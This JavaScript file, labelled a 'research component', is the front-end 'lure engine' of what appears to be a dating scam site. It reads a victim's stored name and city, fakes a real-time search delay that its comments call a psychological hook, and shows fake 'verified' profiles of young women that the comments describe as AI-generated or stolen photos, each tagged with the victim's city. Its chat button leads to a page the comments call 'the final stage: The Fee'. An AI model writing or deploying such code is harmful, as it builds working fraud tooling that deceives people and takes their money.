/**
 * RESEARCH COMPONENT: Dynamic Personalization & Lure Engine
 * Name: matching.js
 */

window.onload = function() {
    // 1. Retrieve the data from our first script
    const victimName = sessionStorage.getItem('userName') || "Guest";
    const victimCity = sessionStorage.getItem('userCity') || "your area";

    // 2. Update the UI to show the 'Scanning' process
    const statusText = document.getElementById('status-text');
    if(statusText) {
        statusText.innerHTML = `Searching for verified partners in <strong>${victimCity}</strong> for <strong>${victimName}</strong>...`;
    }

    // 3. Simulate a "Real-Time" search delay (Psychological Hook)
    setTimeout(() => {
        displayMatches(victimCity);
    }, 3500); 
};

function displayMatches(city) {
    const matchGrid = document.getElementById('match-grid');
    
    // 4. The "Lure" Data: High-quality, AI-generated or stolen photos
    // In research, these are tagged dynamically with the victim's city
    const fakeMatches = [
        { name: "Sarah", age: 24, img: "p1.jpg", bio: "Just moved to " + city },
        { name: "Jessica", age: 22, img: "p2.jpg", bio: "Looking for someone serious in " + city },
        { name: "Amanda", age: 27, img: "p3.jpg", bio: "Active today in " + city }
    ];

    // Clear loading screen and show matches
    document.getElementById('loader-container').style.display = 'none';
    document.getElementById('results-container').style.display = 'block';

    fakeMatches.forEach(girl => {
        matchGrid.innerHTML += `
            <div class="match-card">
                <div class="image-container">
                    <img src="${girl.img}" class="blurred">
                    <div class="verified-badge">✓ Verified</div>
                </div>
                <h3>${girl.name}, ${girl.age}</h3>
                <p>${girl.bio}</p>
                <button class="chat-btn" onclick="openChat()">Message Now</button>
            </div>
        `;
    });
}

function openChat() {
    // This leads to the final stage: The Fee
    window.location.href = "verification.html";
}

